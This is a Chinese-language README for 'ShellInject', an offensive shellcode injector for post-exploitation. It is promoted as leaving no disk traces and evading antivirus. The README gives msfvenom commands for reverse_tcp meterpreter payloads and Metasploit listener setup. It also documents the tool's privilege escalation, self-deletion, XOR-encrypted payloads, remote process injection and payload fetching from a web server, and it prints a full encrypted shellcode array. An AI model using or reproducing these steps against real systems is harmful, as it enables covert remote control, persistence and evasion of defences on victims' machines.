# ShellCode 内存后门注入器

<br>

<div align=center>
  
![logo](https://user-images.githubusercontent.com/52789403/185021479-1816c5bc-2ad4-4d54-beca-08ba5e3b3253.png)

<br>

[![Build status](https://cdn.lyshark.com/archive/LyScript/build.svg)](https://github.com/lyshark/PeView) [![Crowdin](https://cdn.lyshark.com/archive/LyScript/email.svg)](mailto:me@lyshark.com)  [![Download x64dbg](https://cdn.lyshark.com/archive/lydebug/download.svg)](https://github.com/lyshark/lydebug/releases) 

</div>

<br>
<b>版本：1.3</b>
<br>
<b>发布日期：2021-07-05 07:25</b>
<br><br>

ShellInject 是一款通用ShellCode后门注入器，该工具主要用于在后渗透阶段使用，可将后门直接注入到特定进程内存中而不会在磁盘中留下任何痕迹，注入成功后Metasploit即可获取控制权，只要对端不关机则权限会维持，由于内存注入无对应磁盘文件，所以也不会触发杀软报毒。

主要模块与功能:

 - 1.显示可注入进程
 - 2.提升自身权限
 - 3.删除自身痕迹
 - 4.字节数组格式化
 - 5.字节数组格式化
 - 6.文本压缩后异或
 - 7.字符串转为字节数组
 - 8.字节数组加密/解密
 - 9.注入字符串到自身
 - 10.注入字节数组到自身
 - 11.从文本字符串注入
 - 12.注入字符串到远程进程
 - 13.从远程加载字符串并注入
 - 14.从文件读入加密字符串并注入
 - 15.注入加密后的字符串到远程进程

首先需要通过`Metasploit`工具生成一个有效载荷，如下是32位与64位载荷生成命令。
```
32位载荷生成
[root@lyshark ~]# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.116 LPORT=9999 -f c

64位载荷生成
[root@lyshark ~]# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.93.128 LPORT=9999 -f c
```
后台侦听器的配置也分为32位与64位，使用时需要与载荷的位数相对应。
```
32位侦听器配置
msf6 > use exploit/multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set lhost 192.168.1.116
msf6 > set lport 9999

64位侦听器配置
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > set lhost 192.168.93.128
msf6 > set lport 9999
```

**输出可注入进程:** 列举出目前系统中支持注入的进程，输出参数中最左侧是位数，只可做参考有时不太准确。
```
C:\Users\admin\Desktop> sc32.exe --show

[*] x32 进程PID =>      4        进程名 => System
[*] x32 进程PID =>    124        进程名 => Registry
[*] x32 进程PID =>    468        进程名 => smss.exe
[*] x32 进程PID =>    720        进程名 => csrss.exe
[*] x64 进程PID =>   6888        进程名 => explorer.exe
```

**尝试使用令牌提权:** 该命令可以尝试提升自身权限，不过多半提权会是失败的，但也可以试试。
```C
C:\Users\admin\Desktop> sc32.exe --promote

[+] 获取自身Token
[+] 查询进程特权
[*] 已提升为管理员
```

**清除自身痕迹:** 当我们完成远程注入后，记得将自身在系统中删除，此时的ShellCode直接在目标进程中安家了，不需要注入器了。
```
C:\Users\admin\Desktop> sc32.exe --delself

[*] 自身已清除
```

**将攻击载荷格式化为一行:** 将Metasploit生成的ShellCode载荷保存为文件，然后使用该命令直接将其格式化为一行。

在保存ShellCode的时候，请不要保存头部的定义部分，只保存以下代码即可。
```
C:\Users\admin\Desktop> sc32.exe Format --path d://shellcode.txt

fce88f0000006089e531d2648b52308b520c8b52148b722831ff0fb74a2631c0ac3c601d630000687773325f54684......
```

**将攻击载荷格式化并写出:** 这个格式化函数作用与上方相同，只不过可以直接写出到文件中，在你只有一个cmd权限时，可以使用。
```
C:\Users\admin\Desktop> sc32.exe FormatFile --path d://shellcode.txt --output d://format.txt

[+] 已储存 => d://format.txt
```

**加密/解密攻击载荷:** 如上我们可以将shellcode压缩为一行，然后可以调用xor命令，对这段shellcode进行加密处理。
```
C:\Users\admin\Desktop> sc32.exe Xor --path d://format.txt --passwd lyshark

% &{{%ssssssus{z&vpr'quw{!vqps{!vqs {!vqrw{!tqq{pr%%s%!tw"qupr s" p urt sqq qs r %s'
```

**压缩载荷并转字节数组:** 将一段已经压缩过的shellcode代码转换为字节数组格式，这个格式可以直接使用。
```
C:\Users\admin\Desktop> sc32.exe Xchg --input d://format.txt --output d://array.txt

[+] 字节已转为双字节
[*] 已写出ShellCode列表 => d://array.txt
```

**异或加密/解密字节数组:** 将字节数组整体加密或解密为字节数组，无需在程序代码中转换，使用更方便。
```
C:\Users\admin\Desktop>sc32.exe XorArray --path d://array.txt --passwd lyshark

unsigned char ShellCode[] =
"\xbf\xab\xcc\x43\x43\x43\x23\xca\xa6\x72\x91\x27\xc8\x11\x73\xc8"
"\x11\x4f\xc8\x11\x57\xc8\x31\x6b\x72\xbc\x4c\xf4\x9\x65\x72"
"\x83\xef\x7f\x22\x3f\x41\x6f\x63\x82\x8c\x4e\x42\x84\xa\x36"
"\xac\x11\xc8\x11\x53\x14\xc8\x1\x7f\x42\x93\xc8\x3\x3b\xc6"
"\x83\x37\xf\x42\x93\xc8\xb\x5b\xc8\x1b\x63\x42\x90\x13\xc6"
"\x8a\x37\x7f\xa\xc8\x77\xc8\x42\x95\x72\xbc\x72\x83\x82\x8c"
"\x4e\xef\x42\x84\x7b\xa3\x36\xb7\x40\x3e\xbb\x78\x3e\x67\x36"
"\xa3\x1b\xc8\x1b\x67\x42\x90\x25\xc8\x4f\x8\xc8\x1b\x5f\x42"
"\x90\xc8\x47\xc8\x42\x93\xca\x7\x67\x67\x18\x18\x22\x1a\x19"
"\x12\xbc\xa3\x1b\x1c\x19\xc8\x51\xaa\xc3\xbc\xbc\xbc\x1e\x2b"
"\x70\x71\x43\x43\x2b\x34\x30\x71\x1c\x17\x2b\xf\x34\x65\x44"
"\xca\xab\xbc\x93\xfb\xd3\x42\x43\x43\x6a\x87\x17\x13\x2b\x6a"
"\xc3\x28\x43\xbc\x96\x29\x49\x2b\x83\xeb\x1e\xc3\x2b\x41\x43"
"\x64\x4c\xca\xa5\x13\x13\x13\x13\x3\x13\x3\x13\x2b\xa9\x4c"
"\x9c\xa3\xbc\x96\xd4\x29\x53\x15\x14\x2b\xda\xe6\x37\x22\xbc"
"\x96\xc6\x83\x37\x49\xbc\xd\x4b\x36\xaf\xab\x24\x43\x43\x43"
"\x29\x43\x29\x47\x15\x14\x2b\x41\x9a\x8b\x1c\xbc\x96\xc0\xbb"
"\x43\x3d\x75\xc8\x75\x29\x3\x2b\x43\x53\x43\x43\x15\x29\x43"
"\x2b\x1b\xe7\x10\xa6\xbc\x96\xd0\x10\x29\x43\x15\x10\x14\x2b"
"\x41\x9a\x8b\x1c\xbc\x96\xc0\xbb\x43\x3e\x6b\x1b\x2b\x43\x3"
"\x43\x43\x29\x43\x13\x2b\x48\x6c\x4c\x73\xbc\x96\x14\x2b\x36"
"\x2d\xe\x22\xbc\x96\x1d\x1d\xbc\x4f\x67\x4c\xc6\x33\xbc\xbc"
"\xbc\xaa\xd8\xbc\xbc\xbc\x42\x80\x6a\x85\x36\x82\x80\xf8\xb3"
"\xf6\xe1\x15\x29\x43\x10\xbc\x96";
```

**将攻击载荷注入自身反弹:** 将一段压缩过的shellcode注入到自身进程并反弹权限。
```
C:\Users\admin\Desktop> sc32.exe InjectSelfShell --shellcode fce88f0000006031d2648b52308b520c***
```

**注入字节数组到自身进程:** 由于字节数组无法直接命令行方式传递，所以只能在文件中获取并压缩解码反弹。
```
C:\Users\admin\Desktop> sc32.exe InjectArrayByte --path d://shellcode.txt
[+] 解码地址: 19db64
```

**从文件中读入并注入:** 从文件中读入一段已经压缩过的shellcode并执行反弹。
```
C:\Users\admin\Desktop> sc32.exe FileInjectShell --path d://format.txt
```

**注入攻击载荷到远程进程:** 该功能主要用于将代码注入到远程进程中，此处参数已经规范化。
```
C:\Users\admin\Desktop> sc32.exe InjectProcShell --pid 17948 --shellcode fce88f0000006031d2648b52308b520c89e****
```

**从远程加载载荷并注入:** 从远程Web服务器上获取到需要注入的代码，远程服务器保存一行格式字符串即可。
```
C:\Users\admin\Desktop> sc32.exe InjectWebShell --address 127.0.0.1 --payload shellcode.raw
```

**直接运行加密的攻击载荷:** 加密模块可以直接运行被加密过后的shellcode并反弹，注入时需要传递解码密码。
```
C:\Users\admin\Desktop> sc32.exe EncodeInFile --path d://encode.txt --passwd lyshark
```

**加密注入远程进程反弹:** 直接注入加密后的代码到远程进程中，实现方式如上。
```
C:\Users\admin\Desktop> sc32.exe EncodePidInFile --pid 17480 --path d://encode.txt --passwd lyshark
```
